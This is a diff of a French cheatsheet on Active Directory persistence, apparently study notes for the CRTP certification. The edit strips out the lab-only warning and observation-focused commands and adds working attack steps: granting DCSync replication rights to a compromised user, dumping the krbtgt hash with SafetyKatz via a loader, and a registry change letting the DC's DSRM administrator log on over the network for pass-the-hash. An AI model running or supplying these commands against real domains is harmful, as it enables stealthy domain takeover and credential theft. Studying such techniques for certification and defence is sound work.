@@ -1,73 +1,32 @@
 # Cheatsheet - Persistence
 
 > [!summary] Objectif
-> Fournir des points de contrôle utiles pour étudier la persistance dans un lab, avec un angle pédagogique et de compréhension des surfaces d'accroche.
+> Persistance spécifique AD : DCSync (extraire n'importe quel hash à volonté) et l'administrateur DSRM du DC (compte local du DC, indépendant d'un reset de mot de passe de domaine).
 
-> [!warning] Cadre d'utilisation
-> À utiliser uniquement dans un environnement de lab autorisé, dans le cadre de l'apprentissage et de la préparation CRTP.
+### DCSync — droits de réplication
+```powershell
+Get-DomainObjectAcl -SearchBase "DC=<DOMAIN>,DC=local" -SearchScope Base -ResolveGUIDs |
+  ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} |
+  ?{$_.IdentityName -match "<USER>"}
+# si absent, l'ajouter depuis un contexte DA :
+Add-DomainObjectAcl -TargetIdentity 'DC=<DOMAIN>,DC=local' -PrincipalIdentity <USER> -Rights DCSync
+# puis extraire :
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:<DOMAIN>\krbtgt" "exit"
+```
+Une fois le droit `DS-Replication-Get-Changes(-All)` posé sur un user compromis, celui-ci peut extraire le hash de n'importe quel compte (dont `krbtgt`) sans jamais toucher au DC directement — persistance quasi invisible.
 
-## Quand utiliser cette fiche
+### DSRM — administrateur local du DC
+```cmd
+reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
+```
+Autorise le compte DSRM (Administrator local du DC, hash extrait via `lsadump::evasive-sam` après élévation SYSTEM) à se connecter par le réseau. Ensuite Pass-the-Hash (pas OverPass) avec ce hash NTLM local → accès DC indépendant du domaine, survit à un reset de mot de passe de domaine.
 
-- Pendant une phase de révision des mécanismes de persistance vus en formation.
-- Pour analyser des artefacts existants dans un lab prévu à cet effet.
+> [!note] Golden/Diamond ticket sont aussi des mécanismes de persistance (clé `krbtgt`) — détaillés dans [[Cheatsheet - Tickets Kerberos]].
 
-## Prérequis
-
-- Une session autorisée sur l'hôte du lab.
-- Accès PowerShell ou CMD.
-
-## Commandes
-
-### Objectif
-
-Lister les tâches planifiées existantes.
-
-### Commande
-
+### Repères génériques Windows (secondaire)
 ```powershell
 Get-ScheduledTask | Select-Object TaskName, TaskPath, State
-```
-
-### Explication
-
-Aide à repérer les tâches importantes ou inattendues à analyser dans le lab.
-
-### Contexte d’utilisation
-
-Utile dans les exercices où il faut comprendre comment une persistance pourrait être implantée ou détectée.
-
-### Précautions
-
-Rester sur l'observation et ne pas modifier les tâches sans consigne explicite du lab.
-
-### Objectif
-
-Inspecter les clés `Run` classiques.
-
-### Commande
-
-```powershell
 Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
-Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 ```
 
-### Explication
-
-Ces emplacements servent souvent d'exemple pédagogique pour la persistance Windows.
-
-### Contexte d’utilisation
-
-À utiliser pour comparer théorie et artefacts concrets dans une VM de lab.
-
-### Précautions
-
-Ne pas écrire dans le registre hors scénario explicitement prévu.
-
-### Notes associées
-
-- [[Cheatsheet - Post-exploitation]]
-- [[Cheatsheet - Privilege escalation]]
-- [[What is PowerShell]]
-- [[PowerShell - MOC]]
-- [[Attaques AD - MOC]]
-
+**Link** — [[Cheatsheet - Tickets Kerberos]] · [[Cheatsheet - Post-exploitation]] · [[Cheatsheet - Privilege escalation]]
